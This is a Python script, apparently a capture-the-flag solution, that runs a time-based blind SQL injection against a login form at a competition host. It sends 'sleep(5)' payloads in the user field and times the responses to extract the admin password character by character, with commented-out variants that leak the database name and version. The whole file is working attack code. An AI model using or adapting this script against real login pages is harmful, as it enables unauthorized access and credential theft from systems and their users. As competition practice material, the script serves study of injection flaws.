#!/usr/bin/env python3

import requests
import string
import time
import sys

def bruteforcer():
    chars = string.printable[:-6]
    session =  requests.session()
    url = "https://big-blind.hsc.tf/"
    
    admin_password = ""
    while True:
        for char in chars:
            name = f"{admin_password}{char}"
            sys.stdout.write(f"\r[+] Database name: {name}")
            #leak the datbase name being used
            #payload = f"admin' AND (select sleep(5) from dual where  BINARY database() like '{name}%');-- -"
            #leak the database version being used
            #payload = f"admin' AND (select sleep(5) from dual where BINARY version() like '{name}%');-- -"
            #leak the admin's password
            payload = f"admin' AND (select sleep(5) from dual where BINARY pass like '{name}%');-- -"
            data = {"user" : payload,
                    "pass" : "admin"}
            time_started = time.time()
            output = session.post(url, data = data, allow_redirects = False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                admin_password += char
                break


if __name__ == ("__main__"):
    bruteforcer()
